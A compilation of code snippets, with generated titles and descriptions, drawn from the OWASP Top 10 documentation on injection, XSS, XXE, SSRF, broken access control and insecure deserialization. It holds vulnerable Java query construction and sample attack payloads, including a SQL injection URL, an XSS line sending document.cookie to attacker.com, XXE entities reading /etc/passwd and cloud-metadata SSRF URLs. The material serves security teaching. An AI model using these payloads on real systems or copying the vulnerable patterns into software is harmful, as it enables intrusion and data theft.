TITLE: Vulnerable SQL and HQL Query Construction in Java
DESCRIPTION: These Java code snippets demonstrate how applications can be vulnerable to injection flaws when user-supplied data, such as request.getParameter("id"), is directly concatenated into SQL or Hibernate Query Language (HQL) statements without proper validation or parameterization. An attacker can modify the 'id' parameter (e.g., ' UNION SELECT SLEEP(10);--') to alter the query's meaning, potentially leading to data disclosure or manipulation.
SOURCE: https://github.com/owasp/top10/blob/master/2017/he/0xa1-injection.md#_snippet_0

LANGUAGE: Java
CODE:
```
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```

LANGUAGE: Java
CODE:
```
Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");
```

----------------------------------------

TITLE: Vulnerable SQL Query Construction in Java
DESCRIPTION: This snippet demonstrates a classic SQL injection vulnerability where untrusted user input from 'request.getParameter("id")' is directly concatenated into a SQL query string without proper sanitization or parameterization. An attacker can manipulate the 'id' parameter to alter the query's intent.
SOURCE: https://github.com/owasp/top10/blob/master/osib/docs/A03_2021-Injection.md#_snippet_0

LANGUAGE: Java
CODE:
```
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```

----------------------------------------

TITLE: Vulnerable SQL Query Construction (Java)
DESCRIPTION: Demonstrates a classic SQL injection vulnerability where user-supplied data is directly concatenated into a SQL query string without proper sanitization or parameterization. An attacker can manipulate the 'id' parameter to alter the query's intent, potentially leading to unauthorized data access.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-en.html#_snippet_0

LANGUAGE: Java
CODE:
```
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```

----------------------------------------

TITLE: Vulnerable SQL Query Construction in Java
DESCRIPTION: Demonstrates an application constructing a vulnerable SQL query by directly concatenating user-supplied input without validation or parameterization, leading to potential SQL injection.
SOURCE: https://github.com/owasp/top10/blob/master/2021/docs/A03_2021-Injection.md#_snippet_0

LANGUAGE: Java
CODE:
```
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```

----------------------------------------

TITLE: Vulnerable SQL Query Construction in Java
DESCRIPTION: This Java code snippet demonstrates a classic SQL Injection vulnerability. It constructs a SQL query by directly concatenating user-supplied input from 'request.getParameter("id")' into the query string. This method is highly insecure as it allows an attacker to manipulate the query's logic by injecting malicious SQL commands, leading to unauthorized data access or manipulation.
SOURCE: https://github.com/owasp/top10/blob/master/2021/docs/A03_2021-Injection.ja.md#_snippet_0

LANGUAGE: Java
CODE:
```
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```

----------------------------------------

TITLE: Example Server-Side Request Forgery (SSRF) Attack Payloads
DESCRIPTION: These examples demonstrate common URLs or paths used by attackers to exploit SSRF vulnerabilities, allowing access to local files, internal services, or cloud metadata storage.
SOURCE: https://github.com/owasp/top10/blob/master/2021/docs/A10_2021-Server-Side_Request_Forgery_(SSRF).md#_snippet_0

LANGUAGE: URL
CODE:
```
file:///etc/passwd
```

LANGUAGE: URL
CODE:
```
http://localhost:28017/
```

LANGUAGE: URL
CODE:
```
http://169.254.169.254/
```

----------------------------------------

TITLE: Example SQL Injection Attack URL
DESCRIPTION: This URL demonstrates a practical SQL Injection attack scenario. By modifying the 'id' parameter with a malicious SQL payload (' UNION SELECT SLEEP(10);--'), an attacker can alter the intended query's behavior. In this example, it forces the database to pause for 10 seconds and potentially return all records from the 'accounts' table, highlighting the severe impact of such vulnerabilities.
SOURCE: https://github.com/owasp/top10/blob/master/2021/docs/A03_2021-Injection.ja.md#_snippet_2

LANGUAGE: HTTP
CODE:
```
http://example.com/app/accountView?id=' UNION SELECT SLEEP(10);--
```

----------------------------------------

TITLE: Example SQL Injection Attack URL
DESCRIPTION: This URL demonstrates a common SQL injection attack where an attacker modifies the 'id' parameter to inject malicious SQL commands. The 'UNION SELECT SLEEP(10);--' payload attempts to combine a malicious query with the original, potentially causing a delay or extracting data.
SOURCE: https://github.com/owasp/top10/blob/master/2017/ro/0xa1-injection.md#_snippet_1

LANGUAGE: HTTP Request
CODE:
```
http://example.com/app/accountView?id=' UNION SELECT SLEEP(10);--
```

----------------------------------------

TITLE: Example SQL Injection Attack URL
DESCRIPTION: Shows how an attacker modifies the 'id' parameter in a URL to inject a malicious SQL payload, changing the query's meaning to extract all records or perform other harmful actions like delaying responses.
SOURCE: https://github.com/owasp/top10/blob/master/2021/docs/A03_2021-Injection.md#_snippet_2

LANGUAGE: Text
CODE:
```
http://example.com/app/accountView?id=' UNION SELECT SLEEP(10);--
```

----------------------------------------

TITLE: Example SQL Injection Attack URL
DESCRIPTION: This URL demonstrates how an attacker can exploit the previously shown vulnerabilities by injecting malicious SQL (UNION SELECT SLEEP(10);--) into the 'id' parameter. This specific payload attempts to cause a time delay, often used in blind SQL injection, or could be modified for data exfiltration or manipulation.
SOURCE: https://github.com/owasp/top10/blob/master/2017/en/0xa1-injection.md#_snippet_2

LANGUAGE: HTTP Request
CODE:
```
http://example.com/app/accountView?id=' UNION SELECT SLEEP(10);--
```

----------------------------------------

TITLE: Vulnerable Query Construction with Untrusted Input
DESCRIPTION: These examples demonstrate how applications can be vulnerable to injection flaws when user-supplied data is directly concatenated into dynamic queries without proper validation or parameterization. The first example shows a direct SQL query, while the second uses Hibernate Query Language (HQL), both susceptible to injection.
SOURCE: https://github.com/owasp/top10/blob/master/2017/ro/0xa1-injection.md#_snippet_0

LANGUAGE: Java
CODE:
```
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```

LANGUAGE: Java
CODE:
```
Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");
```

----------------------------------------

TITLE: XSS Attack Scenario: Session Hijacking via Parameter Injection
DESCRIPTION: Demonstrates a reflected XSS vulnerability where unsanitized user input from a request parameter is directly embedded into an HTML attribute, allowing an attacker to inject malicious JavaScript to steal session cookies. The first code block shows the vulnerable server-side code, and the second shows the attacker's malicious input.
SOURCE: https://github.com/owasp/top10/blob/master/2017/he/0xa7-xss.md#_snippet_0

LANGUAGE: Java/JSP
CODE:
```
(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```

LANGUAGE: HTML/JavaScript
CODE:
```
'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'
```

----------------------------------------

TITLE: SQL Injection Attack Payload in URL
DESCRIPTION: This URL demonstrates an attacker's crafted payload for SQL injection. By modifying the 'id' parameter to include '' UNION SELECT SLEEP(10);--', the attacker changes the meaning of the original query, potentially leading to data exfiltration, modification, or denial of service (e.g., via SLEEP).
SOURCE: https://github.com/owasp/top10/blob/master/osib/docs/A03_2021-Injection.md#_snippet_2

LANGUAGE: HTTP Request
CODE:
```
http://example.com/app/accountView?id=' UNION SELECT SLEEP(10);--
```

----------------------------------------

TITLE: Vulnerable Java SQL Query with Unverified Input
DESCRIPTION: This Java code snippet demonstrates a common vulnerability where an application uses unverified user input (from request.getParameter("acct")) directly in a SQL query. If not properly sanitized or parameterized, this can lead to SQL Injection, allowing an attacker to manipulate the query and access unauthorized data.
SOURCE: https://github.com/owasp/top10/blob/master/osib/docs/A01_2021-Broken_Access_Control.md#_snippet_0

LANGUAGE: Java
CODE:
```
 pstmt.setString(1, request.getParameter("acct"));
 ResultSet results = pstmt.executeQuery( );
```

----------------------------------------

TITLE: Vulnerable SQL Query Construction in Java
DESCRIPTION: This Java code snippet demonstrates a common SQL injection vulnerability where user-supplied input is directly concatenated into a SQL query without proper sanitization or parameterization. An attacker can manipulate the 'id' parameter to alter the query's intent, potentially leading to unauthorized data access or manipulation.
SOURCE: https://github.com/owasp/top10/blob/master/2017/en/0xa1-injection.md#_snippet_0

LANGUAGE: Java
CODE:
```
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```

----------------------------------------

TITLE: Accessing Account Information via Unverified SQL Parameter
DESCRIPTION: This scenario demonstrates how an attacker can exploit a lack of input validation on a SQL query parameter. By modifying the 'acct' parameter in the URL, an attacker can bypass access controls and retrieve sensitive account information belonging to other users if the application does not properly verify the user's authorization for the requested account.
SOURCE: https://github.com/owasp/top10/blob/master/2021/docs/A01_2021-Broken_Access_Control.md#_snippet_0

LANGUAGE: Java
CODE:
```
 pstmt.setString(1, request.getParameter("acct"));
 ResultSet results = pstmt.executeQuery( );
```

LANGUAGE: HTTP
CODE:
```
 https://example.com/app/accountInfo?acct=notmyacct
```

----------------------------------------

TITLE: Vulnerable Hibernate Query Language (HQL) Construction
DESCRIPTION: This Java code snippet shows a similar injection vulnerability within Hibernate Query Language (HQL). Even when using ORM frameworks, direct concatenation of untrusted user input into queries can lead to injection flaws, allowing attackers to modify query behavior despite the abstraction layer.
SOURCE: https://github.com/owasp/top10/blob/master/2017/en/0xa1-injection.md#_snippet_1

LANGUAGE: Java
CODE:
```
Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");
```

----------------------------------------

TITLE: Preventing Insecure Direct Object References (IDOR) in SQL Queries
DESCRIPTION: This example demonstrates a common vulnerability where an application uses an unverified parameter from a user request directly in a SQL query. An attacker can modify the 'acct' parameter in the URL to access any user's account information, leading to unauthorized data disclosure. Proper input validation and server-side authorization checks are crucial to prevent this.
SOURCE: https://github.com/owasp/top10/blob/master/2021/docs/A01_2021-Broken_Access_Control.ja.md#_snippet_0

LANGUAGE: Java
CODE:
```
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );
```

LANGUAGE: URL
CODE:
```
https://example.com/app/accountInfo?acct=notmyacct
```

----------------------------------------

TITLE: Vulnerable Hibernate Query Language (HQL) Construction in Java
DESCRIPTION: This Java snippet illustrates an Injection vulnerability within the context of Hibernate Query Language (HQL). Similar to direct SQL concatenation, user input from 'request.getParameter("id")' is embedded directly into the HQL query. Despite using an ORM framework like Hibernate, this approach bypasses its protective features, making the application susceptible to HQL injection attacks.
SOURCE: https://github.com/owasp/top10/blob/master/2021/docs/A03_2021-Injection.ja.md#_snippet_1

LANGUAGE: Java
CODE:
```
Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");
```

----------------------------------------

TITLE: Example SQL Injection Attack Payload
DESCRIPTION: An example of an attack payload used to exploit the SQL injection vulnerability. The attacker modifies the 'id' parameter in the URL to inject malicious SQL, changing the query's meaning to potentially retrieve all records or execute arbitrary commands.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-en.html#_snippet_2

LANGUAGE: HTTP
CODE:
```
http://example.com/app/accountView?id=' UNION SELECT SLEEP(10);--
```

----------------------------------------

TITLE: URL Parameter Manipulation for Account Access
DESCRIPTION: This HTTP URL example illustrates how an attacker can manipulate a URL parameter ('acct') to attempt to access another user's account. This is a direct exploitation method for broken access control when server-side validation is insufficient, allowing unauthorized data access by simply changing a value in the URL.
SOURCE: https://github.com/owasp/top10/blob/master/2017/en/0xa5-broken-access-control.md#_snippet_1

LANGUAGE: HTTP
CODE:
```
http://example.com/app/accountInfo?acct=notmyacct
```

----------------------------------------

TITLE: URL Parameter Modification for Account Access (IDOR)
DESCRIPTION: This URL example illustrates how an attacker can modify a browser's 'acct' parameter (https://example.com/app/accountInfo?acct=notmyacct) to attempt to access another user's account. This highlights an Insecure Direct Object Reference (IDOR) vulnerability if the application does not properly verify the user's authorization for the requested account.
SOURCE: https://github.com/owasp/top10/blob/master/osib/docs/A01_2021-Broken_Access_Control.md#_snippet_1

LANGUAGE: HTTP Request
CODE:
```
 https://example.com/app/accountInfo?acct=notmyacct
```

----------------------------------------

TITLE: Vulnerable HTML Generation with Unescaped User Input
DESCRIPTION: This code snippet demonstrates a common vulnerability where an application directly embeds unvalidated and unescaped user input (from request.getParameter("CC")) into an HTML attribute. This allows for reflected XSS attacks if an attacker provides malicious input like '"/><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'', leading to session hijacking.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-en.html#_snippet_8

LANGUAGE: Java/JSP
CODE:
```
(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```

----------------------------------------

TITLE: Denial of Service (DoS) Vulnerabilities
DESCRIPTION: Explains how design and coding practices significantly influence the magnitude of denial of service attacks, even though DoS is always possible given sufficient resources. Examples include large files accessible without controls or computationally expensive transactions on every page, which reduce the effort required for a DoS attack.
SOURCE: https://github.com/owasp/top10/blob/master/osib/docs/A11_2021-Next_Steps.md#_snippet_1

LANGUAGE: APIDOC
CODE:
```
Denial of Service:
  Description:
    Always possible given sufficient resources, but design and coding practices significantly bearing on magnitude.
    Examples: Large file accessible by anyone with link, or computationally expensive transaction on every page.
  Prevention:
    Performance test code for CPU, I/O, and memory usage.
    Re-architect, optimize, or cache expensive operations.
    Consider access controls for larger objects to ensure only authorized individuals can access huge files or objects or serve them by an edge caching network.
  Example Attack Scenarios:
    An attacker determines an operation takes 5-10 seconds. Running four concurrent threads stops server response. Attacker uses 1000 threads to take entire system offline.
  Metrics:
    CWEs Mapped: 8
    Max Incidence Rate: 17.54%
    Avg Incidence Rate: 4.89%
    Avg Weighted Exploit: 8.3
    Avg Weighted Impact: 5.9
    Max Coverage: 79.58%
    Avg Coverage: 33.26%
    Total Occurrences: 66985
    Total CVEs: 973
```

----------------------------------------

TITLE: Code Quality Issues
DESCRIPTION: Describes known security defects or patterns, such as reusing variables, sensitive information exposure in debugging, off-by-one errors, TOCTOU race conditions, unsigned/signed conversion errors, and use-after-free. These issues are often identifiable with stringent compiler flags, static code analysis tools, and linter IDE plugins. Modern languages like Rust and Go mitigate many of these issues by design.
SOURCE: https://github.com/owasp/top10/blob/master/osib/docs/A11_2021-Next_Steps.md#_snippet_0

LANGUAGE: APIDOC
CODE:
```
Code Quality Issues:
  Description:
    Includes known security defects or patterns, reusing variables for multiple purposes, exposure of sensitive information in debugging output, off-by-one errors, time of check/time of use (TOCTOU) race conditions, unsigned or signed conversion errors, use after free, and more.
    Hallmark: Usually identifiable with stringent compiler flags, static code analysis tools, and linter IDE plugins.
    Mitigation by modern languages: Rust’s memory ownership and borrowing concept, Rust’s threading design, and Go’s strict typing and bounds checking.
  Prevention:
    Enable and use editor and language’s static code analysis options.
    Consider using a static code analysis tool.
    Consider using or migrating to a language or framework that eliminates bug classes (e.g., Rust or Go).
  Example Attack Scenarios:
    An attacker might obtain or update sensitive information by exploiting a race condition using a statically shared variable across multiple threads.
  Metrics:
    CWEs Mapped: 38
    Max Incidence Rate: 49.46%
    Avg Incidence Rate: 2.22%
    Avg Weighted Exploit: 7.1
    Avg Weighted Impact: 6.7
    Max Coverage: 60.85%
    Avg Coverage: 23.42%
    Total Occurrences: 101736
    Total CVEs: 7564
```

----------------------------------------

TITLE: Example XSS Attack Scenario: Session Hijacking
DESCRIPTION: Demonstrates a reflected XSS attack where an attacker injects malicious JavaScript into an HTML input field to steal a user's session ID. The application fails to validate or escape user input before including it in the HTML output, leading to a session hijacking vulnerability.
SOURCE: https://github.com/owasp/top10/blob/master/2017/ro/0xa7-xss.md#_snippet_0

LANGUAGE: Pseudo-code
CODE:
```
(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```

LANGUAGE: JavaScript
CODE:
```
'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'
```

----------------------------------------

TITLE: Illustrating Reflected XSS Vulnerability and Exploit
DESCRIPTION: This snippet shows a vulnerable Java/JSP-like code line that concatenates unvalidated user input directly into HTML, leading to a Reflected XSS vulnerability. The accompanying attacker payload demonstrates how malicious JavaScript can be injected to steal session cookies.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-pt-br.html#_snippet_5

LANGUAGE: Java
CODE:
```
(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + ">";
```

LANGUAGE: JavaScript
CODE:
```
'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'
```

----------------------------------------

TITLE: Demonstrating Reflected XSS via Unescaped Input
DESCRIPTION: This scenario illustrates how an application vulnerable to reflected XSS can be exploited. It shows a Java/JSP-like code snippet that concatenates unvalidated user input directly into an HTML attribute, allowing an attacker to inject malicious JavaScript to steal session cookies.
SOURCE: https://github.com/owasp/top10/blob/master/2017/en/0xa7-xss.md#_snippet_0

LANGUAGE: Java/JSP
CODE:
```
(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```

LANGUAGE: JavaScript
CODE:
```
'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'
```

----------------------------------------

TITLE: SQL Query with Unverified Account Parameter
DESCRIPTION: This SQL snippet demonstrates a common vulnerability where an application uses an unverified 'acct' parameter directly in a database query. An attacker can modify this parameter in the browser to access any user's account, leading to unauthorized information disclosure. This highlights the critical need for server-side validation of all user-supplied input before it is used in database operations.
SOURCE: https://github.com/owasp/top10/blob/master/2017/en/0xa5-broken-access-control.md#_snippet_0

LANGUAGE: SQL
CODE:
```
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery();
```

----------------------------------------

TITLE: Exploiting Broken Access Control via SQL Injection
DESCRIPTION: This scenario demonstrates how an attacker can exploit a lack of input validation in a SQL query to access unauthorized account information. By manipulating the 'acct' parameter in the URL, an attacker can bypass intended access controls and retrieve data belonging to other users. This highlights the critical need for proper server-side validation of all user-supplied input before it is used in database queries.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-en.html#_snippet_6

LANGUAGE: Java/SQL
CODE:
```
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery();
```

LANGUAGE: HTTP
CODE:
```
http://example.com/app/accountInfo?acct=notmyacct
```

----------------------------------------

TITLE: Preventing Broken Authentication
DESCRIPTION: This section provides best practices and recommendations for preventing broken authentication vulnerabilities, covering multi-factor authentication, strong password policies, credential recovery, and secure session management.
SOURCE: https://github.com/owasp/top10/blob/master/2017/he/0xa2-broken-authentication.md#_snippet_1

LANGUAGE: APIDOC
CODE:
```
Prevention Strategies:
- Implement multi-factor authentication to prevent automated, credential stuffing, brute force, and stolen credential re-use attacks.
- Do not ship or deploy with any default credentials, particularly for admin users.
- Implement weak-password checks, such as testing new or changed passwords against a list of the top 10000 worst passwords.
- Align password length, complexity and rotation policies with NIST 800-63 B's guidelines in section 5.1.1 for Memorized Secrets or other modern, evidence based password policies.
- Ensure registration, credential recovery, and API pathways are hardened against account enumeration attacks by using the same messages for all outcomes.
- Limit or increasingly delay failed login attempts. Log all failures and alert administrators when credential stuffing, brute force, or other attacks are detected.
- Use a server-side, secure, built-in session manager that generates a new random session ID with high entropy after login. Session IDs should not be in the URL, be securely stored and invalidated after logout, idle, and absolute timeouts.
```

----------------------------------------

TITLE: SQL Query with Unverified Input Leading to Access Control Bypass
DESCRIPTION: This example demonstrates a common vulnerability where an application uses unverified user input (e.g., from a request parameter) directly in a SQL query. An attacker can manipulate the 'acct' parameter to access any user's account if proper input validation and authorization checks are not implemented, leading to unauthorized data access.
SOURCE: https://github.com/owasp/top10/blob/master/2017/he/0xa5-broken-access-control.md#_snippet_0

LANGUAGE: Java
CODE:
```
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery();
```

LANGUAGE: HTTP Request
CODE:
```
http://example.com/app/accountInfo?acct=notmyacct
```

----------------------------------------

TITLE: SQL Parameter Modification for Account Access
DESCRIPTION: This scenario demonstrates how an attacker can modify a URL parameter ('acct') to bypass access control and access other users' account information if the application uses unverified data in SQL queries. This highlights the importance of proper input validation and authorization checks.
SOURCE: https://github.com/owasp/top10/blob/master/2017/ro/0xa5-broken-access-control.md#_snippet_0

LANGUAGE: Java
CODE:
```
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery();
```

LANGUAGE: HTTP
CODE:
```
http://example.com/app/accountInfo?acct=notmyacct
```

----------------------------------------

TITLE: Identifying Broken Authentication Vulnerabilities
DESCRIPTION: This section outlines common indicators and conditions that suggest an application may be vulnerable to broken authentication attacks, focusing on weaknesses in user identity confirmation, authentication, and session management.
SOURCE: https://github.com/owasp/top10/blob/master/2017/he/0xa2-broken-authentication.md#_snippet_0

LANGUAGE: APIDOC
CODE:
```
Vulnerability Indicators:
- Permits automated attacks such as credential stuffing or brute force.
- Permits default, weak, or well-known passwords (e.g., "Password1", "admin/admin").
- Uses weak or ineffective credential recovery and forgot-password processes (e.g., knowledge-based answers).
- Uses plain text, encrypted, or weakly hashed passwords.
- Has missing or ineffective multi-factor authentication.
- Exposes Session IDs in the URL (e.g., URL rewriting).
- Does not rotate Session IDs after successful login.
- Does not properly invalidate Session IDs during logout or a period of inactivity.
```

----------------------------------------

TITLE: Accessing Accounts via Unverified SQL Parameter
DESCRIPTION: This scenario demonstrates a SQL injection vulnerability where an attacker manipulates the 'acct' parameter in a URL. If the application uses this unverified input directly in a SQL query, it allows the attacker to access or modify any user's account, leading to unauthorized data exposure.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-pt-br.html#_snippet_3

LANGUAGE: Java
CODE:
```
pstmt.setString(1, request.ge arameter("acct"));
ResultSet results = pstmt.executeQuery( );
```

LANGUAGE: HTTP
CODE:
```
http://example.com/app/accountInfo?acct=notmyacct
```

----------------------------------------

TITLE: Forced Browsing and Broken Access Control via URLs
DESCRIPTION: These URL examples (https://example.com/app/getappInfo, https://example.com/app/admin_getappInfo) demonstrate a forced browsing scenario. If an unauthenticated user can access the general info page, or a non-admin user can access the admin page, it indicates a broken access control vulnerability, allowing unauthorized access to sensitive functionalities or information.
SOURCE: https://github.com/owasp/top10/blob/master/osib/docs/A01_2021-Broken_Access_Control.md#_snippet_2

LANGUAGE: HTTP Request
CODE:
```
 https://example.com/app/getappInfo
 https://example.com/app/admin_getappInfo
```

----------------------------------------

TITLE: Force Browsing to Restricted Application Pages
DESCRIPTION: This scenario illustrates a force browsing vulnerability where an attacker attempts to directly access URLs that should be restricted based on authentication status or user roles. If an unauthenticated user can access pages requiring login, or a standard user can access administrative pages, it indicates a broken access control flaw.
SOURCE: https://github.com/owasp/top10/blob/master/2021/docs/A01_2021-Broken_Access_Control.md#_snippet_1

LANGUAGE: HTTP
CODE:
```
 https://example.com/app/getappInfo
```

LANGUAGE: HTTP
CODE:
```
 https://example.com/app/admin_getappInfo
```

----------------------------------------

TITLE: Vulnerable Hibernate Query Language (HQL) Construction
DESCRIPTION: Illustrates an application using Hibernate Query Language (HQL) that is vulnerable to injection due to direct concatenation of untrusted user input into the query, despite using a framework.
SOURCE: https://github.com/owasp/top10/blob/master/2021/docs/A03_2021-Injection.md#_snippet_1

LANGUAGE: Java
CODE:
```
Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");
```

----------------------------------------

TITLE: Vulnerable Hibernate Query Language (HQL) Construction
DESCRIPTION: This snippet shows a similar injection vulnerability within a Hibernate Query Language (HQL) query. Despite using a framework, direct concatenation of untrusted user input ('request.getParameter("id")') into the HQL string can still lead to injection, allowing attackers to bypass intended query logic.
SOURCE: https://github.com/owasp/top10/blob/master/osib/docs/A03_2021-Injection.md#_snippet_1

LANGUAGE: Java
CODE:
```
Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");
```

----------------------------------------

TITLE: Vulnerable Hibernate HQL Query (Java)
DESCRIPTION: Illustrates an injection vulnerability in Hibernate Query Language (HQL) where untrusted user input is directly embedded into the HQL query. This example shows that even when using frameworks, improper handling of input can still lead to injection flaws.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-en.html#_snippet_1

LANGUAGE: Java
CODE:
```
Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");
```

----------------------------------------

TITLE: PHP Object Serialization Example (Admin Privilege Escalation)
DESCRIPTION: This PHP serialized string demonstrates a common attack scenario where an attacker modifies the serialized object to gain administrative privileges. By changing the user ID to '1', username to 'Alice', and the role to 'admin', the attacker can bypass access controls and elevate their permissions.
SOURCE: https://github.com/owasp/top10/blob/master/2017/he/0xa8-insecure-deserialization.md#_snippet_1

LANGUAGE: PHP
CODE:
```
a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

----------------------------------------

TITLE: Force Browsing to Bypass Access Controls
DESCRIPTION: This scenario illustrates a common attack where an attacker attempts to access restricted or administrative pages by directly navigating to their URLs. If the application lacks proper server-side access control checks, an unauthenticated user might access authenticated pages, or a standard user might access privileged administrative pages, exposing sensitive information or functionality.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-en.html#_snippet_7

LANGUAGE: HTTP
CODE:
```
http://example.com/app/getappInfo
```

LANGUAGE: HTTP
CODE:
```
http://example.com/app/admin_getappInfo
```

----------------------------------------

TITLE: Force Browsing to Bypass Access Controls
DESCRIPTION: This scenario illustrates how attackers can exploit broken access controls by directly navigating to restricted URLs. If an unauthenticated user can access pages intended for authenticated users, or a standard user can access administrative pages, it indicates a critical flaw in the application's authorization enforcement.
SOURCE: https://github.com/owasp/top10/blob/master/2017/he/0xa5-broken-access-control.md#_snippet_1

LANGUAGE: HTTP Request
CODE:
```
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
```

----------------------------------------

TITLE: Force Browsing to Bypass Access Controls
DESCRIPTION: This scenario illustrates how attackers attempt to bypass access controls by directly navigating to restricted URLs. If unauthenticated users can access authenticated pages, or standard users can reach administrative pages, it indicates a critical access control flaw.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-pt-br.html#_snippet_4

LANGUAGE: HTTP
CODE:
```
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
```

----------------------------------------

TITLE: Extracting Data with XML External Entity (XXE)
DESCRIPTION: This XML snippet demonstrates a common XXE attack scenario where an attacker attempts to extract sensitive data, specifically the `/etc/passwd` file, from the server. The `<!ENTITY xxe SYSTEM "file:///etc/passwd" >` declaration defines an external entity that points to the target file, which is then referenced within the `<foo>&xxe;</foo>` element, causing the XML parser to include the file's content.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-en.html#_snippet_3

LANGUAGE: XML
CODE:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

----------------------------------------

TITLE: PHP Object Serialization Example and Tampering
DESCRIPTION: This snippet illustrates a PHP serialized object used to store user state, demonstrating both the original benign object and a tampered version. The tampered object shows how an attacker can modify serialized data to escalate privileges, such as changing a 'user' role to 'admin', highlighting a common insecure deserialization exploit.
SOURCE: https://github.com/owasp/top10/blob/master/2017/ro/0xa8-insecure-deserialization.md#_snippet_0

LANGUAGE: PHP
CODE:
```
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

LANGUAGE: PHP
CODE:
```
a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

----------------------------------------

TITLE: XXE Attack: Data Extraction from Server
DESCRIPTION: This XML snippet demonstrates an XXE attack where an attacker attempts to extract sensitive data, such as the /etc/passwd file, from the server by defining an external entity that points to a local file system path. This is a common method for unauthorized file access.
SOURCE: https://github.com/owasp/top10/blob/master/2017/ro/0xa4-xxe.md#_snippet_0

LANGUAGE: XML
CODE:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>
```

----------------------------------------

TITLE: XXE Attack: Data Extraction from Server
DESCRIPTION: This XML snippet demonstrates an XXE attack designed to extract sensitive data, such as the contents of /etc/passwd, from the server's file system. It uses an external entity to reference a local file.
SOURCE: https://github.com/owasp/top10/blob/master/2017/en/0xa4-xxe.md#_snippet_0

LANGUAGE: XML
CODE:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

----------------------------------------

TITLE: XXE Attack: Data Extraction from Server
DESCRIPTION: This XML snippet demonstrates an XXE attack designed to extract sensitive data, specifically the `/etc/passwd` file, from the server by defining an external entity that points to a local file system path.
SOURCE: https://github.com/owasp/top10/blob/master/2017/he/0xa4-xxe.md#_snippet_0

LANGUAGE: XML
CODE:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>
```

----------------------------------------

TITLE: XXE Attack: Extracting Data from Server
DESCRIPTION: This XML snippet demonstrates an XXE attack where an external entity is used to read the content of a local file (e.g., /etc/passwd) from the server's file system. The <!ENTITY xxe SYSTEM "file:///etc/passwd" > declaration defines an external entity 'xxe' that points to the specified file, which is then referenced within the XML document to trigger the file read.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-pt-br.html#_snippet_0

LANGUAGE: XML
CODE:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <foo>&xxe;</foo>
```

